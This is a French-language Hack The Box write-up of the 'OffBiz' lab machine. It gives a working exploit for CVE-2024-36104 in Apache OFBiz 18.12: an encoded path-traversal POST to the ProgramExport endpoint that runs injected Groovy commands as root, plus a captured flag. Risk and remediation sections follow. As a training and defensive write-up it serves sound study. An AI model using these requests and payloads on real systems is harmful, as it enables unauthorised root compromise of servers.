# HTB — OFBiz Write-up

- **Machine :** OffBiz
- **Plateforme :** Hack The Box
- **OS :** Linux
- **IP :** 10.129.231.23

---

## Description

La machine expose une instance **Apache OFBiz 18.12**, un ERP web accessible en HTTPS via `/catalog`. Cette version est vulnérable à **CVE-2024-36104**, une faille de **Path Traversal** dans le composant `webtools` qui permet de contourner les contrôles d'accès et d'atteindre le point d'entrée `ProgramExport`, lequel interprète du code **Groovy** fourni en paramètre. Ce *workflow* (outils d'administration/export de webtools) n'est normalement accessible qu'aux administrateurs authentifiés ; le path traversal permet de le contourner entièrement, ouvrant la voie à une exécution de commandes arbitraire (RCE) côté serveur.

---

## Exploitation

### 1. Reconnaissance

```bash
nmap -sV 10.129.231.23
```

Ports intéressants :

```
22  → SSH
80  → HTTP
443 → HTTPS
```

Le port 80 n'affiche que la page par défaut de NGINX ; le HTTPS est donc testé.

### 2. Découverte de l'application

```bash
gobuster dir -u https://10.129.231.23 -k -w /usr/share/wordlists/dirb/common.txt
```

Répertoire trouvé : `/catalog`, qui redirige vers `/catalog/control/main` — une page de connexion.

Le code source de la page révèle :

```
Powered by Apache OFBiz. Release 18.12
```

Cette version permet d'identifier la vulnérabilité connue **CVE-2024-36104**.

### 3. Identification de la vulnérabilité

CVE-2024-36104 (Apache OFBiz) permet un **Path Traversal** via des séquences encodées (`%2e` = `.`), qui débouche sur une **RCE**. La requête vulnérable cible le composant `webtools`.

### 4. Exploitation via Burp Repeater

Requête modifiée pour contourner le contrôle d'accès et atteindre `ProgramExport` :

```http
POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
Host: 10.129.231.23
Content-Type: application/x-www-form-urlencoded
Connection: close

groovyProgram=test
```

Réponse initiale : `Web Tools Permission Error`, mais une erreur Groovy apparaît également :

```
MissingPropertyException: No such property: test
```

Cela confirme que le paramètre `groovyProgram` est interprété par le moteur Groovy — le mécanisme vulnérable est bien atteint.

### 5. Exécution de commandes

Remplacement de la valeur par un payload Groovy exécutant une commande système :

```groovy
throw new Exception('id'.execute().text)
```

Résultat :

```
uid=0(root) gid=0(root) groups=0(root)
```

La commande `id` est exécutée avec les privilèges **root**, confirmant une RCE en root.

### 6. Reconnaissance post-exploitation

```groovy
throw new Exception('pwd'.execute().text)
```

Résultat : `/root/ofbiz-framework`.

### 7. Récupération du flag

```groovy
throw new Exception('cat /root/root.txt'.execute().text)
```

Résultat : `85ae696787f9c3b897311801fbd23cf6`

---

## PoC

```http
POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
Host: 10.129.231.23
Content-Type: application/x-www-form-urlencoded
Connection: close

groovyProgram=throw new Exception('id'.execute().text)
```

```groovy
throw new Exception('cat /root/root.txt'.execute().text)
```

---

## Risk

- **Contournement d'authentification/autorisation** : le path traversal encodé permet d'atteindre un point d'entrée normalement protégé (`webtools`) sans être authentifié.
- **Exécution de code arbitraire (RCE)** : le paramètre `groovyProgram` est interprété directement par le moteur Groovy côté serveur, ce qui permet d'exécuter n'importe quelle commande système.
- **Exécution avec les privilèges root** : la RCE s'exécute directement en tant que `root`, ce qui constitue une compromission totale et immédiate de la machine, sans étape de privesc supplémentaire.
- **Impact global** : accès complet au système (lecture/écriture de tout fichier, y compris les données sensibles de l'ERP), risque de pivot vers d'autres systèmes connectés à l'application, arrêt de service possible.

---

## Remediation

- Mettre à jour Apache OFBiz vers une version corrigeant CVE-2024-36104 (patch officiel du projet).
- Renforcer la validation et la normalisation des chemins côté serveur pour empêcher tout contournement par séquences encodées (`%2e`, `../`, etc.) avant application des contrôles d'accès.
- Désactiver ou restreindre l'accès aux composants `webtools` (dont `ProgramExport`) en production, ou les protéger derrière une authentification forte et un contrôle réseau (liste blanche d'IP, VPN).
- Ne jamais exécuter les processus applicatifs avec les privilèges root ; appliquer le principe de moindre privilège sur le compte système exécutant OFBiz.
- Mettre en place une supervision/alerting sur les tentatives de path traversal et les erreurs Groovy inhabituelles dans les logs applicatifs.

---

## Résumé

**Machine :** OffBiz
**Vulnérabilité principale :** CVE-2024-36104 — Path Traversal → RCE Groovy (Apache OFBiz 18.12)
**Accès initial :** RCE directe via `ProgramExport`
**Privilèges obtenus :** Root (immédiat)

**Flags :**
- Root : `85ae696787f9c3b897311801fbd23cf6`
